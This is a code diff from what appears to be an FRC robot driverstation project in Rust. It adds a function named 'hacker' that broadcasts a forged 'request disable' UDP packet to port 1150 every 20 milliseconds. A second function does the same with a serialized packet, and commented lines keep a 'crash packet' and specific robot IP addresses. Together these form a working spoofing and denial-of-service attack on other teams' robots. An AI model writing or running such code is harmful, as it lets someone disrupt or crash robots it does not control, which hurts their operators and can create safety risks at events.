@@ -6,7 +6,7 @@
 // netconsole_socket.set_input_nonblocking(true);
 
 use std::{
-    net::{IpAddr, Ipv4Addr},
+    net::{IpAddr, Ipv4Addr, SocketAddr, SocketAddrV4},
     sync::Arc,
 };
 
@@ -20,9 +20,11 @@ use net_comm::driverstation::{
 use robot_comm::{
     common::{
         joystick::{Joystick, NonNegU16},
-        request_code::RobotRequestCode,
+        request_code::{DriverstationRequestCode, RobotRequestCode},
     },
     driverstation::RobotComm,
+    robot_to_driver::RobotToDriverstationPacket,
+    util::buffer_writter::{BufferWritter, SliceBufferWritter, WriteToBuff},
 };
 
 #[derive(Default, Clone, Copy)]
@@ -153,7 +155,7 @@ pub fn controller(driverstation: Arc<RobotComm>) {
     let mut povs = [Pov::default(); 6];
     loop {
         while let Some(event) = gilrs.next_event() {
-            println!("{:#?}", event);
+            // println!("{:#?}", event);
 
             driverstation.modify_joystick(event.id.into(), |controller| {
                 if event.event == gilrs::EventType::Connected || controller.is_none() {
@@ -278,7 +280,62 @@ pub mod roborio;
 fn main() {
     // bruh::run_bruh()
     // simulate_roborio()
-    run_driverstation()
+    // run_driverstation()
+    // run_bruh()
+    hacker()
+}
+
+pub fn hacker() {
+    use std::net::*;
+    use std::time::Duration;
+
+    let disable_packet = [
+        0u8, 0, 1, /*com version*/
+        0, 0xFF, 0, 0, 2, /*request disable*/
+    ];
+
+    // broadcast
+    let ip_addr = Ipv4Addr::new(255, 255, 255, 255);
+    let socket_addr = SocketAddr::V4(SocketAddrV4::new(ip_addr, 1150));
+    let socket = UdpSocket::bind("0.0.0.0:1110").unwrap();
+    socket.set_broadcast(true).unwrap();
+    loop {
+        socket.send_to(&disable_packet, socket_addr).unwrap();
+        std::thread::sleep(Duration::from_millis(20));
+    }
+}
+
+pub fn run_bruh() {
+    let mut packet = RobotToDriverstationPacket::default();
+
+    packet.tag_comm_version = 1;
+    packet.request.set_request_disable(true);
+
+    let mut buf = [0u8; 200];
+    let mut buf2 = [0u8; 200];
+    let mut buf = SliceBufferWritter::new(&mut buf);
+    packet.write_to_buf(&mut buf).unwrap();
+    let buf = buf.curr_buf();
+
+    println!("{:?}", buf);
+
+    // let disable_packet = [0,0,1 /*com version*/,0,0,0,0,2 /*request disable*/];
+    // let crash_packet = [0,0,0 /*invalid comm tag*/,0,0,0,0,0xFF /* no idea why but this is needed too*/];
+    // std::net::UdpSocket::join_multicast_v4(&self, multicast_loop_v4)
+    // let ip_addr = Ipv4Addr::new(10,11,14,206);
+    let ip_addr = Ipv4Addr::new(255, 255, 255, 255);
+
+    // let ip_addr = Ipv4Addr::new(10,39,66,178);
+    let socket_addr = SocketAddr::V4(SocketAddrV4::new(ip_addr, 1150));
+    let socket = std::net::UdpSocket::bind("0.0.0.0:1110").unwrap();
+    socket.set_broadcast(true).unwrap();
+    loop {
+        // println!("{:?}", socket.recv_from(&mut buf2).unwrap());
+        socket.send_to(&buf2, socket_addr).unwrap();
+        std::thread::sleep(std::time::Duration::from_millis(20));
+        // socket.send_to(&crash_packet, socket_addr).unwrap();
+        // std::thread::sleep(std::time::Duration::from_millis(20));
+    }
 }
 
 pub fn run_driverstation() {
